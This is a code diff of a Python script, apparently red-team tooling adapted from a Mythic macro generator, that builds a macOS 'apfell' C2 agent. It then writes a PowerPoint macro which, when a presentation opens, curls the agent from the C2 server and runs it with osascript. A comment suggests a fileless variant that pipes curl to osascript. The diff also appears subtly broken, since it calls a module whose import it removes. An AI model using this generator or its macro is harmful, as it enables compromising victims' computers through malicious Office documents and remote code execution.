@@ -1,100 +1,52 @@
 # Adapted from https://github.com/cedowens/Mythic-Macro-Generator
 
-import shutil, errno, os
-from mythic import *
-import subprocess
-import sys
-from Settings.MythicSettings import *
+import os
+import asyncio
+from .Utilities import *
 
 
 def macro_powerpoint():
     payload = "./Payloads/MacroPowerPoint_Payload"
-    #url = mythic_payload_url + "/PowerPoint_Macro.js"   # Used for where the JXA payload is hosted
+    # url = mythic_payload_url + "/PowerPoint_Macro.js"   # Used for where the JXA payload is hosted
 
-    os.mkdir(payload,0o775)
+    os.mkdir(payload, 0o775)
 
     ## Create apfell payload
     async def scripting():
-        mythic = mythic_rest.Mythic(
-            username=mythic_username,
-            password=mythic_password,
-            server_ip=mythic_server_ip,
-            server_port=mythic_server_port,
-            ssl=mythic_ssl,
-            global_timeout=-1,
-        )
         print("[+] Logging into Mythic")
-        await mythic.login()
-        await mythic.set_or_create_apitoken()
-        # define what our payload should be
-        p = mythic_rest.Payload(
-            # what payload type is it
-            payload_type="apfell", 
-            # define non-default c2 profile variables
-            c2_profiles={
-                "http":[
-                        {"name": "callback_host", "value": mythic_http_callback_host},
-                        {"name": "callback_interval", "value": mythic_http_callback_interval},
-                        {"name": "callback_port", "value": mythic_http_callback_port}
-                    ]
-                },
-            # give our payload a description if we want
-            tag="PowerPoint Macro",
-            selected_os="macOS",
-            # if we want to only include specific commands, put them here:
-            #commands=["cmd1", "cmd2", "cmd3"],
-            # what do we want the payload to be called
-            filename="PowerPoint_Macro.js")
+        mythic_instance = await login_mythic()
         print("[+] Creating new apfell payload")
-        # create the payload and include all commands
-        # if we define commands in the payload definition, then remove the all_commands=True piece
-        resp = await mythic.create_payload(p, all_commands=True, wait_for_build=True)
+        # define what our payload should be
+        resp = await create_apfell_payload(mythic_instance=mythic_instance,
+                                           description="PowerPoint Macro",
+                                           filename="PowerPoint_Macro.js",
+                                           include_all_commands=True)
+        if resp["build_phase"] == "success":
+            payload_contents = await mythic.download_payload(mythic=mythic_instance, payload_uuid=resp["uuid"])
+            payload_info = await get_payload_data(mythic_instance=mythic_instance, payload_uuid=resp["uuid"])
+            url = await get_payload_download_url(payload_info)
+            pkg_payload = payload + "/PowerPoint_Macro.js"
+            with open(pkg_payload, "wb") as f:
+                f.write(payload_contents)
+            macrofile = open(payload + '/macro.txt', 'w')
+            # macrofile.write('Sub AutoOpen()\n')
+            macrofile.write('Sub App_AfterPresentationOpen()\n')
+            macrofile.write("MacScript(\"do shell script \"\"curl -k %s -o powerpoint.js\"\" \")" % url)
+            macrofile.write("\n")
+            macrofile.write("MacScript(\"do shell script \"\"chmod +x powerpoint.js\"\"\")")
+            macrofile.write("\n")
+            macrofile.write("MacScript(\"do shell script \"\"osascript powerpoint.js &\"\"\")")
+            macrofile.write("\n")
+            macrofile.write("End Sub")
 
-        payloadDownloadid = resp.response.file["agent_file_id"]
-
-        payload_contents = await mythic.download_payload(resp.response)
-        pkg_payload = payload + "/PowerPoint_Macro.js"
-        with open(pkg_payload, "wb") as f:
-            f.write(payload_contents)  
-
-        url = "https://" + mythic_server_ip + ":" + mythic_server_port + "/api/v1.4/files/download/" + payloadDownloadid # modify to point to desired location
-
-        macrofile = open(payload + '/macro.txt', 'w')
-        #macrofile.write('Sub AutoOpen()\n')
-        macrofile.write('Sub App_AfterPresentationOpen()\n')
-        macrofile.write("MacScript(\"do shell script \"\"curl -k %s -o powerpoint.js\"\" \")"%url)
-        macrofile.write("\n")
-        macrofile.write("MacScript(\"do shell script \"\"chmod +x powerpoint.js\"\"\")")
-        macrofile.write("\n")
-        macrofile.write("MacScript(\"do shell script \"\"osascript powerpoint.js &\"\"\")")
-        macrofile.write("\n")
-        macrofile.write("End Sub")
-
-        print("Note: \n"
-              "1) Copy the macro from Payloads/MacroPowerPoint_Payload/macro.txt to paste into Powerpoint \n"
-              "2) When the macro is executed it will save to ~/Library/Containers/com.microsoft.Powerpoint/Data/powerpoint.js\n"
-              "3) You could replace command with 'curl -k 'URL' | osascript -l JavaScript &' to avoid disk writes but in testing this hangs the application")
- 
-
-
+            print("Note: \n"
+                  "1) Copy the macro from Payloads/MacroPowerPoint_Payload/macro.txt to paste into Powerpoint \n"
+                  "2) When the macro is executed it will save to ~/Library/Containers/com.microsoft.Powerpoint/Data/powerpoint.js\n"
+                  "3) You could replace command with 'curl -k 'URL' | osascript -l JavaScript &' to avoid disk writes but in testing this hangs the application")
+        else:
+            print(f"[-] Failed to build payload:  {resp['build_stderr']}\n{resp['build_message']}")
 
     async def main():
         await scripting()
-        try:
-            while True:
-                pending = mythic_rest.asyncio.all_tasks()
-                plist = []
-                for p in pending:
-                    if p._coro.__name__ != "main" and p._state == "PENDING":
-                        plist.append(p)
-                if len(plist) == 0:
-                    exit(0)
-                else:
-                    await mythic_rest.asyncio.gather(*plist)
-        except KeyboardInterrupt:
-            pending = mythic_rest.asyncio.all_tasks()
-            for t in pending:
-                t.cancel()    
 
-    loop = mythic_rest.asyncio.get_event_loop()
-    loop.run_until_complete(main())
+    asyncio.run(main())
